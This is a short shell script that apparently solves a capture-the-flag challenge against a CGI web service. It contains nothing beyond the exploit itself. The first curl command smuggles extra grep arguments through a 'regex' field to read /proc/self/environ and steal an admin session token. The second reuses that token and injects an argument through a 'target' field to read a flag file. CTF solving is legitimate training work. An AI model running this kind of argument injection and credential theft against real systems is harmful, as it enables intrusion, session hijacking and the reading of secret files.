sess=$(curl -v 'http://ictf2.maple3142.net:8763/cgi-bin/match' -d 'text=a&regex=^.* /proc/self/environ -a' | tr '\0' '\n' | grep ADMIN_SESSION | awk -F= '{print $2}')
curl -H "Cookie: session=$sess" 'http://ictf2.maple3142.net:8763/cgi-bin/getlogs' -d 'target= -I /readflag' -v --output -
